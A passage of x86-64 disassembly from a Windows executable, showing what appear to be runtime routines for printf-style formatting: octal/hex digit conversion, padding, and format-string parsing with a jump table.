   14000801d:	e9 af fc ff ff       	jmp    0x140007cd1
   140008022:	45 85 c0             	test   %r8d,%r8d
   140008025:	0f 85 e7 fe ff ff    	jne    0x140007f12
   14000802b:	85 d2                	test   %edx,%edx
   14000802d:	0f 84 c1 fd ff ff    	je     0x140007df4
   140008033:	e9 d4 fd ff ff       	jmp    0x140007e0c
   140008038:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000803f:	00 
   140008040:	55                   	push   %rbp
   140008041:	41 57                	push   %r15
   140008043:	41 56                	push   %r14
   140008045:	41 55                	push   %r13
   140008047:	41 54                	push   %r12
   140008049:	57                   	push   %rdi
   14000804a:	56                   	push   %rsi
   14000804b:	53                   	push   %rbx
   14000804c:	48 83 ec 28          	sub    $0x28,%rsp
   140008050:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140008057:	00 
   140008058:	83 f9 6f             	cmp    $0x6f,%ecx
   14000805b:	41 89 cb             	mov    %ecx,%r11d
   14000805e:	49 89 d1             	mov    %rdx,%r9
   140008061:	4c 89 c6             	mov    %r8,%rsi
   140008064:	0f 84 16 02 00 00    	je     0x140008280
   14000806a:	45 8b 50 10          	mov    0x10(%r8),%r10d
   14000806e:	bb 00 00 00 00       	mov    $0x0,%ebx
   140008073:	45 8b 60 08          	mov    0x8(%r8),%r12d
   140008077:	45 85 d2             	test   %r10d,%r10d
   14000807a:	41 0f 49 da          	cmovns %r10d,%ebx
   14000807e:	83 c3 12             	add    $0x12,%ebx
   140008081:	41 f7 c4 00 10 00 00 	test   $0x1000,%r12d
   140008088:	0f 85 52 01 00 00    	jne    0x1400081e0
   14000808e:	4c 63 46 0c          	movslq 0xc(%rsi),%r8
   140008092:	48 63 c3             	movslq %ebx,%rax
   140008095:	41 39 d8             	cmp    %ebx,%r8d
   140008098:	49 0f 4d c0          	cmovge %r8,%rax
   14000809c:	48 83 c0 0f          	add    $0xf,%rax
   1400080a0:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400080a4:	e8 67 e6 ff ff       	call   0x140006710
   1400080a9:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400080ae:	ba 0f 00 00 00       	mov    $0xf,%edx
   1400080b3:	48 29 c4             	sub    %rax,%rsp
   1400080b6:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   1400080bb:	4d 85 c9             	test   %r9,%r9
   1400080be:	48 89 fb             	mov    %rdi,%rbx
   1400080c1:	0f 84 19 02 00 00    	je     0x1400082e0
   1400080c7:	45 89 dd             	mov    %r11d,%r13d
   1400080ca:	41 83 e5 20          	and    $0x20,%r13d
   1400080ce:	66 90                	xchg   %ax,%ax
   1400080d0:	89 d0                	mov    %edx,%eax
   1400080d2:	48 83 c3 01          	add    $0x1,%rbx
   1400080d6:	44 21 c8             	and    %r9d,%eax
   1400080d9:	44 8d 70 30          	lea    0x30(%rax),%r14d
   1400080dd:	83 c0 37             	add    $0x37,%eax
   1400080e0:	44 09 e8             	or     %r13d,%eax
   1400080e3:	45 89 f7             	mov    %r14d,%r15d
   1400080e6:	41 80 fe 3a          	cmp    $0x3a,%r14b
   1400080ea:	41 0f 42 c7          	cmovb  %r15d,%eax
   1400080ee:	49 d3 e9             	shr    %cl,%r9
   1400080f1:	4d 85 c9             	test   %r9,%r9
   1400080f4:	88 43 ff             	mov    %al,-0x1(%rbx)
   1400080f7:	75 d7                	jne    0x1400080d0
   1400080f9:	48 39 fb             	cmp    %rdi,%rbx
   1400080fc:	0f 84 de 01 00 00    	je     0x1400082e0
   140008102:	45 85 d2             	test   %r10d,%r10d
   140008105:	0f 8e f5 00 00 00    	jle    0x140008200
   14000810b:	48 89 d8             	mov    %rbx,%rax
   14000810e:	44 89 d2             	mov    %r10d,%edx
   140008111:	48 29 f8             	sub    %rdi,%rax
   140008114:	29 c2                	sub    %eax,%edx
   140008116:	85 d2                	test   %edx,%edx
   140008118:	89 d0                	mov    %edx,%eax
   14000811a:	0f 8e e0 00 00 00    	jle    0x140008200
   140008120:	83 e8 01             	sub    $0x1,%eax
   140008123:	48 8d 4c 03 01       	lea    0x1(%rbx,%rax,1),%rcx
   140008128:	48 89 c2             	mov    %rax,%rdx
   14000812b:	48 89 d8             	mov    %rbx,%rax
   14000812e:	66 90                	xchg   %ax,%ax
   140008130:	48 83 c0 01          	add    $0x1,%rax
   140008134:	c6 40 ff 30          	movb   $0x30,-0x1(%rax)
   140008138:	48 39 c8             	cmp    %rcx,%rax
   14000813b:	75 f3                	jne    0x140008130
   14000813d:	48 63 c2             	movslq %edx,%rax
   140008140:	48 8d 5c 03 01       	lea    0x1(%rbx,%rax,1),%rbx
   140008145:	48 39 fb             	cmp    %rdi,%rbx
   140008148:	0f 84 ce 00 00 00    	je     0x14000821c
   14000814e:	48 89 d8             	mov    %rbx,%rax
   140008151:	48 29 f8             	sub    %rdi,%rax
   140008154:	44 39 c0             	cmp    %r8d,%eax
   140008157:	0f 8c d5 00 00 00    	jl     0x140008232
   14000815d:	41 83 fb 6f          	cmp    $0x6f,%r11d
   140008161:	c7 46 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rsi)
   140008168:	0f 84 22 03 00 00    	je     0x140008490
   14000816e:	f6 46 09 08          	testb  $0x8,0x9(%rsi)
   140008172:	0f 85 8b 02 00 00    	jne    0x140008403
   140008178:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
   14000817e:	48 39 df             	cmp    %rbx,%rdi
   140008181:	73 47                	jae    0x1400081ca
   140008183:	45 8d 65 ff          	lea    -0x1(%r13),%r12d
   140008187:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000818e:	00 00 
   140008190:	48 83 eb 01          	sub    $0x1,%rbx
   140008194:	0f be 0b             	movsbl (%rbx),%ecx
   140008197:	48 89 f2             	mov    %rsi,%rdx
   14000819a:	e8 01 ea ff ff       	call   0x140006ba0
   14000819f:	48 39 fb             	cmp    %rdi,%rbx
   1400081a2:	77 ec                	ja     0x140008190
   1400081a4:	45 85 ed             	test   %r13d,%r13d
   1400081a7:	7f 0a                	jg     0x1400081b3
   1400081a9:	eb 1f                	jmp    0x1400081ca
   1400081ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400081b0:	41 89 c4             	mov    %eax,%r12d
   1400081b3:	48 89 f2             	mov    %rsi,%rdx
   1400081b6:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400081bb:	e8 e0 e9 ff ff       	call   0x140006ba0
   1400081c0:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   1400081c5:	45 85 e4             	test   %r12d,%r12d
   1400081c8:	7f e6                	jg     0x1400081b0
   1400081ca:	48 8d 65 a8          	lea    -0x58(%rbp),%rsp
   1400081ce:	5b                   	pop    %rbx
   1400081cf:	5e                   	pop    %rsi
   1400081d0:	5f                   	pop    %rdi
   1400081d1:	41 5c                	pop    %r12
   1400081d3:	41 5d                	pop    %r13
   1400081d5:	41 5e                	pop    %r14
   1400081d7:	41 5f                	pop    %r15
   1400081d9:	5d                   	pop    %rbp
   1400081da:	c3                   	ret
   1400081db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400081e0:	66 41 83 78 20 00    	cmpw   $0x0,0x20(%r8)
   1400081e6:	0f 84 04 02 00 00    	je     0x1400083f0
   1400081ec:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400081f1:	e9 af 01 00 00       	jmp    0x1400083a5
   1400081f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400081fd:	00 00 00 
   140008200:	41 83 fb 6f          	cmp    $0x6f,%r11d
   140008204:	0f 84 e6 00 00 00    	je     0x1400082f0
   14000820a:	45 85 d2             	test   %r10d,%r10d
   14000820d:	0f 84 3b ff ff ff    	je     0x14000814e
   140008213:	48 39 fb             	cmp    %rdi,%rbx
   140008216:	0f 85 32 ff ff ff    	jne    0x14000814e
   14000821c:	c6 03 30             	movb   $0x30,(%rbx)
   14000821f:	48 83 c3 01          	add    $0x1,%rbx
   140008223:	48 89 d8             	mov    %rbx,%rax
   140008226:	48 29 f8             	sub    %rdi,%rax
   140008229:	44 39 c0             	cmp    %r8d,%eax
   14000822c:	0f 8d 2b ff ff ff    	jge    0x14000815d
   140008232:	41 29 c0             	sub    %eax,%r8d
   140008235:	41 83 fb 6f          	cmp    $0x6f,%r11d
   140008239:	8b 56 08             	mov    0x8(%rsi),%edx
   14000823c:	45 89 c5             	mov    %r8d,%r13d
   14000823f:	44 89 46 0c          	mov    %r8d,0xc(%rsi)
   140008243:	0f 84 c7 00 00 00    	je     0x140008310
   140008249:	f6 c6 08             	test   $0x8,%dh
   14000824c:	0f 84 e2 00 00 00    	je     0x140008334
   140008252:	41 83 ed 02          	sub    $0x2,%r13d
   140008256:	45 85 ed             	test   %r13d,%r13d
   140008259:	7e 0b                	jle    0x140008266
   14000825b:	8b 4e 10             	mov    0x10(%rsi),%ecx
   14000825e:	85 c9                	test   %ecx,%ecx
   140008260:	0f 88 0a 02 00 00    	js     0x140008470
   140008266:	44 88 1b             	mov    %r11b,(%rbx)
   140008269:	48 83 c3 02          	add    $0x2,%rbx
   14000826d:	c6 43 ff 30          	movb   $0x30,-0x1(%rbx)
   140008271:	45 85 ed             	test   %r13d,%r13d
   140008274:	0f 8f c5 00 00 00    	jg     0x14000833f
   14000827a:	e9 ff fe ff ff       	jmp    0x14000817e
   14000827f:	90                   	nop
   140008280:	45 8b 50 10          	mov    0x10(%r8),%r10d
   140008284:	bb 00 00 00 00       	mov    $0x0,%ebx
   140008289:	45 8b 60 08          	mov    0x8(%r8),%r12d
   14000828d:	45 85 d2             	test   %r10d,%r10d
   140008290:	41 0f 49 da          	cmovns %r10d,%ebx
   140008294:	83 c3 18             	add    $0x18,%ebx
   140008297:	41 f7 c4 00 10 00 00 	test   $0x1000,%r12d
   14000829e:	0f 85 f0 00 00 00    	jne    0x140008394
   1400082a4:	4c 63 46 0c          	movslq 0xc(%rsi),%r8
   1400082a8:	48 63 c3             	movslq %ebx,%rax
   1400082ab:	41 39 d8             	cmp    %ebx,%r8d
   1400082ae:	49 0f 4d c0          	cmovge %r8,%rax
   1400082b2:	48 83 c0 0f          	add    $0xf,%rax
   1400082b6:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400082ba:	e8 51 e4 ff ff       	call   0x140006710
   1400082bf:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400082c4:	ba 07 00 00 00       	mov    $0x7,%edx
   1400082c9:	48 29 c4             	sub    %rax,%rsp
   1400082cc:	4d 85 c9             	test   %r9,%r9
   1400082cf:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   1400082d4:	48 89 fb             	mov    %rdi,%rbx
   1400082d7:	0f 85 ea fd ff ff    	jne    0x1400080c7
   1400082dd:	0f 1f 00             	nopl   (%rax)
   1400082e0:	41 81 e4 ff f7 ff ff 	and    $0xfffff7ff,%r12d
   1400082e7:	44 89 66 08          	mov    %r12d,0x8(%rsi)
   1400082eb:	e9 12 fe ff ff       	jmp    0x140008102
   1400082f0:	f6 46 09 08          	testb  $0x8,0x9(%rsi)
   1400082f4:	0f 84 10 ff ff ff    	je     0x14000820a
   1400082fa:	c6 03 30             	movb   $0x30,(%rbx)
   1400082fd:	48 83 c3 01          	add    $0x1,%rbx
   140008301:	e9 04 ff ff ff       	jmp    0x14000820a
   140008306:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000830d:	00 00 00 
   140008310:	44 8b 46 10          	mov    0x10(%rsi),%r8d
   140008314:	45 85 c0             	test   %r8d,%r8d
   140008317:	0f 88 f6 00 00 00    	js     0x140008413
   14000831d:	45 8d 65 ff          	lea    -0x1(%r13),%r12d
   140008321:	80 e6 04             	and    $0x4,%dh
   140008324:	74 3d                	je     0x140008363
   140008326:	48 39 fb             	cmp    %rdi,%rbx
   140008329:	0f 87 61 fe ff ff    	ja     0x140008190
   14000832f:	e9 7f fe ff ff       	jmp    0x1400081b3
   140008334:	8b 46 10             	mov    0x10(%rsi),%eax
   140008337:	85 c0                	test   %eax,%eax
   140008339:	0f 88 31 01 00 00    	js     0x140008470
   14000833f:	45 8d 65 ff          	lea    -0x1(%r13),%r12d
   140008343:	80 e6 04             	and    $0x4,%dh
   140008346:	74 1b                	je     0x140008363
   140008348:	48 39 df             	cmp    %rbx,%rdi
   14000834b:	0f 82 3f fe ff ff    	jb     0x140008190
   140008351:	e9 5d fe ff ff       	jmp    0x1400081b3
   140008356:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000835d:	00 00 00 
   140008360:	41 89 c4             	mov    %eax,%r12d
   140008363:	48 89 f2             	mov    %rsi,%rdx
   140008366:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000836b:	e8 30 e8 ff ff       	call   0x140006ba0
   140008370:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   140008375:	45 85 e4             	test   %r12d,%r12d
   140008378:	7f e6                	jg     0x140008360
   14000837a:	48 39 fb             	cmp    %rdi,%rbx
   14000837d:	0f 86 47 fe ff ff    	jbe    0x1400081ca
   140008383:	41 bc fe ff ff ff    	mov    $0xfffffffe,%r12d
   140008389:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
   14000838f:	e9 fc fd ff ff       	jmp    0x140008190
   140008394:	66 41 83 78 20 00    	cmpw   $0x0,0x20(%r8)
   14000839a:	0f 84 0a 01 00 00    	je     0x1400084aa
   1400083a0:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400083a5:	89 d8                	mov    %ebx,%eax
   1400083a7:	ba ab aa aa aa       	mov    $0xaaaaaaab,%edx
   1400083ac:	4c 63 46 0c          	movslq 0xc(%rsi),%r8
   1400083b0:	f7 e2                	mul    %edx
   1400083b2:	d1 ea                	shr    $1,%edx
   1400083b4:	01 d3                	add    %edx,%ebx
   1400083b6:	44 39 c3             	cmp    %r8d,%ebx
   1400083b9:	48 63 c3             	movslq %ebx,%rax
   1400083bc:	49 0f 4c c0          	cmovl  %r8,%rax
   1400083c0:	48 83 c0 0f          	add    $0xf,%rax
   1400083c4:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400083c8:	e8 43 e3 ff ff       	call   0x140006710
   1400083cd:	ba 0f 00 00 00       	mov    $0xf,%edx
   1400083d2:	48 29 c4             	sub    %rax,%rsp
   1400083d5:	41 83 fb 6f          	cmp    $0x6f,%r11d
   1400083d9:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   1400083de:	0f 85 d7 fc ff ff    	jne    0x1400080bb
   1400083e4:	ba 07 00 00 00       	mov    $0x7,%edx
   1400083e9:	e9 cd fc ff ff       	jmp    0x1400080bb
   1400083ee:	66 90                	xchg   %ax,%ax
   1400083f0:	4c 63 46 0c          	movslq 0xc(%rsi),%r8
   1400083f4:	48 63 c3             	movslq %ebx,%rax
   1400083f7:	44 39 c3             	cmp    %r8d,%ebx
   1400083fa:	49 0f 4c c0          	cmovl  %r8,%rax
   1400083fe:	e9 99 fc ff ff       	jmp    0x14000809c
   140008403:	44 88 1b             	mov    %r11b,(%rbx)
   140008406:	48 83 c3 02          	add    $0x2,%rbx
   14000840a:	c6 43 ff 30          	movb   $0x30,-0x1(%rbx)
   14000840e:	e9 65 fd ff ff       	jmp    0x140008178
   140008413:	89 d0                	mov    %edx,%eax
   140008415:	25 00 06 00 00       	and    $0x600,%eax
   14000841a:	3d 00 02 00 00       	cmp    $0x200,%eax
   14000841f:	0f 85 f8 fe ff ff    	jne    0x14000831d
   140008425:	45 8d 45 ff          	lea    -0x1(%r13),%r8d
   140008429:	44 89 c0             	mov    %r8d,%eax
   14000842c:	48 8d 4c 03 01       	lea    0x1(%rbx,%rax,1),%rcx
   140008431:	48 89 d8             	mov    %rbx,%rax
   140008434:	48 83 c0 01          	add    $0x1,%rax
   140008438:	c6 40 ff 30          	movb   $0x30,-0x1(%rax)
   14000843c:	48 39 c8             	cmp    %rcx,%rax
   14000843f:	75 f3                	jne    0x140008434
   140008441:	49 63 c0             	movslq %r8d,%rax
   140008444:	45 29 e8             	sub    %r13d,%r8d
   140008447:	41 83 fb 6f          	cmp    $0x6f,%r11d
   14000844b:	48 8d 5c 03 01       	lea    0x1(%rbx,%rax,1),%rbx
   140008450:	45 89 c5             	mov    %r8d,%r13d
   140008453:	0f 84 18 fe ff ff    	je     0x140008271
   140008459:	f6 c6 08             	test   $0x8,%dh
   14000845c:	0f 85 04 fe ff ff    	jne    0x140008266
   140008462:	e9 0a fe ff ff       	jmp    0x140008271
   140008467:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000846e:	00 00 
   140008470:	89 d0                	mov    %edx,%eax
   140008472:	25 00 06 00 00       	and    $0x600,%eax
   140008477:	3d 00 02 00 00       	cmp    $0x200,%eax
   14000847c:	74 a7                	je     0x140008425
   14000847e:	f6 c6 08             	test   $0x8,%dh
   140008481:	0f 85 df fd ff ff    	jne    0x140008266
   140008487:	e9 b3 fe ff ff       	jmp    0x14000833f
   14000848c:	0f 1f 40 00          	nopl   0x0(%rax)
   140008490:	48 39 fb             	cmp    %rdi,%rbx
   140008493:	41 bc fe ff ff ff    	mov    $0xfffffffe,%r12d
   140008499:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
   14000849f:	0f 87 eb fc ff ff    	ja     0x140008190
   1400084a5:	e9 20 fd ff ff       	jmp    0x1400081ca
   1400084aa:	4c 63 46 0c          	movslq 0xc(%rsi),%r8
   1400084ae:	48 63 c3             	movslq %ebx,%rax
   1400084b1:	44 39 c3             	cmp    %r8d,%ebx
   1400084b4:	49 0f 4c c0          	cmovl  %r8,%rax
   1400084b8:	48 83 c0 0f          	add    $0xf,%rax
   1400084bc:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400084c0:	e8 4b e2 ff ff       	call   0x140006710
   1400084c5:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400084ca:	48 29 c4             	sub    %rax,%rsp
   1400084cd:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   1400084d2:	e9 0d ff ff ff       	jmp    0x1400083e4
   1400084d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400084de:	00 00 
   1400084e0:	41 57                	push   %r15
   1400084e2:	41 56                	push   %r14
   1400084e4:	41 55                	push   %r13
   1400084e6:	41 54                	push   %r12
   1400084e8:	55                   	push   %rbp
   1400084e9:	57                   	push   %rdi
   1400084ea:	56                   	push   %rsi
   1400084eb:	53                   	push   %rbx
   1400084ec:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
   1400084f3:	48 8d 2d a2 12 38 00 	lea    0x3812a2(%rip),%rbp        # 0x14038979c
   1400084fa:	41 89 cc             	mov    %ecx,%r12d
   1400084fd:	48 89 d7             	mov    %rdx,%rdi
   140008500:	44 89 c6             	mov    %r8d,%esi
   140008503:	4c 89 cb             	mov    %r9,%rbx
   140008506:	41 81 e4 00 60 00 00 	and    $0x6000,%r12d
   14000850d:	e8 3e 35 00 00       	call   0x14000ba50
   140008512:	31 d2                	xor    %edx,%edx
   140008514:	31 c9                	xor    %ecx,%ecx
   140008516:	8b 00                	mov    (%rax),%eax
   140008518:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   14000851d:	44 89 64 24 78       	mov    %r12d,0x78(%rsp)
   140008522:	c7 44 24 7c ff ff ff 	movl   $0xffffffff,0x7c(%rsp)
   140008529:	ff 
   14000852a:	c7 84 24 8c 00 00 00 	movl   $0x0,0x8c(%rsp)
   140008531:	00 00 00 00 
   140008535:	89 44 24 34          	mov    %eax,0x34(%rsp)
   140008539:	48 b8 ff ff ff ff fd 	movabs $0xfffffffdffffffff,%rax
   140008540:	ff ff ff 
   140008543:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   14000854a:	00 
   14000854b:	31 c0                	xor    %eax,%eax
   14000854d:	66 89 84 24 88 00 00 	mov    %ax,0x88(%rsp)
   140008554:	00 
   140008555:	0f b7 03             	movzwl (%rbx),%eax
   140008558:	66 89 94 24 90 00 00 	mov    %dx,0x90(%rsp)
   14000855f:	00 
   140008560:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
   140008567:	00 00 00 00 
   14000856b:	89 b4 24 98 00 00 00 	mov    %esi,0x98(%rsp)
   140008572:	c7 84 24 9c 00 00 00 	movl   $0xffffffff,0x9c(%rsp)
   140008579:	ff ff ff ff 
   14000857d:	48 8d 73 02          	lea    0x2(%rbx),%rsi
   140008581:	85 c0                	test   %eax,%eax
   140008583:	74 19                	je     0x14000859e
   140008585:	83 f8 25             	cmp    $0x25,%eax
   140008588:	74 66                	je     0x1400085f0
   14000858a:	48 85 c9             	test   %rcx,%rcx
   14000858d:	0f b7 43 02          	movzwl 0x2(%rbx),%eax
   140008591:	74 4d                	je     0x1400085e0
   140008593:	48 89 f3             	mov    %rsi,%rbx
   140008596:	85 c0                	test   %eax,%eax
   140008598:	48 8d 73 02          	lea    0x2(%rbx),%rsi
   14000859c:	75 e7                	jne    0x140008585
   14000859e:	48 85 c9             	test   %rcx,%rcx
   1400085a1:	74 1c                	je     0x1400085bf
   1400085a3:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1400085a8:	48 29 ce             	sub    %rcx,%rsi
   1400085ab:	48 c7 44 24 7c ff ff 	movq   $0xffffffffffffffff,0x7c(%rsp)
   1400085b2:	ff ff 
   1400085b4:	48 d1 fe             	sar    $1,%rsi
   1400085b7:	8d 56 ff             	lea    -0x1(%rsi),%edx
   1400085ba:	e8 f1 e8 ff ff       	call   0x140006eb0
   1400085bf:	8b 84 24 94 00 00 00 	mov    0x94(%rsp),%eax
   1400085c6:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
   1400085cd:	5b                   	pop    %rbx
   1400085ce:	5e                   	pop    %rsi
   1400085cf:	5f                   	pop    %rdi
   1400085d0:	5d                   	pop    %rbp
   1400085d1:	41 5c                	pop    %r12
   1400085d3:	41 5d                	pop    %r13
   1400085d5:	41 5e                	pop    %r14
   1400085d7:	41 5f                	pop    %r15
   1400085d9:	c3                   	ret
   1400085da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400085e0:	48 89 d9             	mov    %rbx,%rcx
   1400085e3:	48 89 f3             	mov    %rsi,%rbx
   1400085e6:	eb 95                	jmp    0x14000857d
   1400085e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400085ef:	00 
   1400085f0:	4c 8d 6c 24 70       	lea    0x70(%rsp),%r13
   1400085f5:	48 85 c9             	test   %rcx,%rcx
   1400085f8:	74 1d                	je     0x140008617
   1400085fa:	48 c7 44 24 7c ff ff 	movq   $0xffffffffffffffff,0x7c(%rsp)
   140008601:	ff ff 
   140008603:	48 89 f2             	mov    %rsi,%rdx
   140008606:	4d 89 e8             	mov    %r13,%r8
   140008609:	48 29 ca             	sub    %rcx,%rdx
   14000860c:	48 d1 fa             	sar    $1,%rdx
   14000860f:	83 ea 01             	sub    $0x1,%edx
   140008612:	e8 99 e8 ff ff       	call   0x140006eb0
   140008617:	0f b7 53 02          	movzwl 0x2(%rbx),%edx
   14000861b:	44 89 64 24 78       	mov    %r12d,0x78(%rsp)
   140008620:	48 89 f7             	mov    %rsi,%rdi
   140008623:	45 31 ff             	xor    %r15d,%r15d
   140008626:	48 c7 44 24 7c ff ff 	movq   $0xffffffffffffffff,0x7c(%rsp)
   14000862d:	ff ff 
   14000862f:	4d 8d 55 0c          	lea    0xc(%r13),%r10
   140008633:	45 31 f6             	xor    %r14d,%r14d
   140008636:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   14000863b:	48 8d 5f 02          	lea    0x2(%rdi),%rbx
   14000863f:	0f b7 c2             	movzwl %dx,%eax
   140008642:	66 85 d2             	test   %dx,%dx
   140008645:	89 c1                	mov    %eax,%ecx
   140008647:	0f 84 9c 08 00 00    	je     0x140008ee9
   14000864d:	8d 42 e0             	lea    -0x20(%rdx),%eax
   140008650:	66 83 f8 5a          	cmp    $0x5a,%ax
   140008654:	0f 87 69 06 00 00    	ja     0x140008cc3
   14000865a:	0f b7 c0             	movzwl %ax,%eax
   14000865d:	48 63 44 85 00       	movslq 0x0(%rbp,%rax,4),%rax
   140008662:	48 01 e8             	add    %rbp,%rax
   140008665:	ff e0                	jmp    *%rax
   140008667:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   14000866e:	00 
   14000866f:	41 83 ef 02          	sub    $0x2,%r15d
   140008673:	41 83 ff 01          	cmp    $0x1,%r15d
   140008677:	48 8b 08             	mov    (%rax),%rcx
   14000867a:	48 8d 70 08          	lea    0x8(%rax),%rsi
   14000867e:	0f 86 20 01 00 00    	jbe    0x1400087a4
   140008684:	4c 89 ea             	mov    %r13,%rdx
   140008687:	e8 84 ed ff ff       	call   0x140007410
   14000868c:	48 89 b4 24 10 01 00 	mov    %rsi,0x110(%rsp)
   140008693:	00 
   140008694:	31 c9                	xor    %ecx,%ecx
   140008696:	0f b7 03             	movzwl (%rbx),%eax
   140008699:	e9 df fe ff ff       	jmp    0x14000857d
   14000869e:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   1400086a5:	00 
   1400086a6:	41 83 ef 02          	sub    $0x2,%r15d
   1400086aa:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
   1400086b1:	ff ff ff ff 
   1400086b5:	48 8b bc 24 10 01 00 	mov    0x110(%rsp),%rdi
   1400086bc:	00 
   1400086bd:	41 83 ff 01          	cmp    $0x1,%r15d
   1400086c1:	8b 00                	mov    (%rax),%eax
   1400086c3:	48 8d 77 08          	lea    0x8(%rdi),%rsi
   1400086c7:	0f 86 8a 04 00 00    	jbe    0x140008b57
   1400086cd:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400086d2:	4d 89 e8             	mov    %r13,%r8
   1400086d5:	ba 01 00 00 00       	mov    $0x1,%edx
   1400086da:	88 44 24 60          	mov    %al,0x60(%rsp)
   1400086de:	e8 1d e5 ff ff       	call   0x140006c00
   1400086e3:	48 89 b4 24 10 01 00 	mov    %rsi,0x110(%rsp)
   1400086ea:	00 
   1400086eb:	eb a7                	jmp    0x140008694
   1400086ed:	45 85 f6             	test   %r14d,%r14d
   1400086f0:	0f 85 5a 05 00 00    	jne    0x140008c50
   1400086f6:	83 4c 24 78 40       	orl    $0x40,0x78(%rsp)
   1400086fb:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   1400086ff:	e9 8c 00 00 00       	jmp    0x140008790
   140008704:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140008708:	83 c8 20             	or     $0x20,%eax
   14000870b:	89 44 24 78          	mov    %eax,0x78(%rsp)
   14000870f:	48 8b bc 24 10 01 00 	mov    0x110(%rsp),%rdi
   140008716:	00 
   140008717:	48 83 84 24 10 01 00 	addq   $0x8,0x110(%rsp)
   14000871e:	00 08 
   140008720:	a8 04                	test   $0x4,%al
   140008722:	48 8b 17             	mov    (%rdi),%rdx
   140008725:	0f 84 e5 05 00 00    	je     0x140008d10
   14000872b:	db 2a                	fldt   (%rdx)
   14000872d:	4c 89 ea             	mov    %r13,%rdx
   140008730:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008735:	db 7c 24 40          	fstpt  0x40(%rsp)
   140008739:	e8 22 ee ff ff       	call   0x140007560
   14000873e:	e9 51 ff ff ff       	jmp    0x140008694
   140008743:	45 85 f6             	test   %r14d,%r14d
   140008746:	0f 85 04 05 00 00    	jne    0x140008c50
   14000874c:	81 4c 24 78 00 04 00 	orl    $0x400,0x78(%rsp)
   140008753:	00 
   140008754:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   140008758:	eb 36                	jmp    0x140008790
   14000875a:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   14000875e:	66 83 fa 36          	cmp    $0x36,%dx
   140008762:	0f 84 06 07 00 00    	je     0x140008e6e
   140008768:	66 83 fa 33          	cmp    $0x33,%dx
   14000876c:	0f 84 df 07 00 00    	je     0x140008f51
   140008772:	41 bf 03 00 00 00    	mov    $0x3,%r15d
   140008778:	41 be 04 00 00 00    	mov    $0x4,%r14d
   14000877e:	eb 10                	jmp    0x140008790
   140008780:	83 4c 24 78 04       	orl    $0x4,0x78(%rsp)
   140008785:	41 be 04 00 00 00    	mov    $0x4,%r14d
   14000878b:	0f b7 57 02          	movzwl 0x2(%rdi),%edx
   14000878f:	90                   	nop
   140008790:	48 89 df             	mov    %rbx,%rdi
   140008793:	e9 a3 fe ff ff       	jmp    0x14000863b
   140008798:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   14000879f:	00 
   1400087a0:	48 8d 70 08          	lea    0x8(%rax),%rsi
   1400087a4:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   1400087ab:	00 
   1400087ac:	48 8b 38             	mov    (%rax),%rdi
   1400087af:	48 8d 05 ca 0f 38 00 	lea    0x380fca(%rip),%rax        # 0x140389780
   1400087b6:	48 85 ff             	test   %rdi,%rdi
   1400087b9:	48 0f 44 f8          	cmove  %rax,%rdi
   1400087bd:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   1400087c4:	85 c0                	test   %eax,%eax
   1400087c6:	0f 88 d3 06 00 00    	js     0x140008e9f
   1400087cc:	48 63 d0             	movslq %eax,%rdx
   1400087cf:	48 89 f9             	mov    %rdi,%rcx
   1400087d2:	e8 e9 2d 00 00       	call   0x14000b5c0
   1400087d7:	4d 89 e8             	mov    %r13,%r8
   1400087da:	89 c2                	mov    %eax,%edx
   1400087dc:	48 89 f9             	mov    %rdi,%rcx
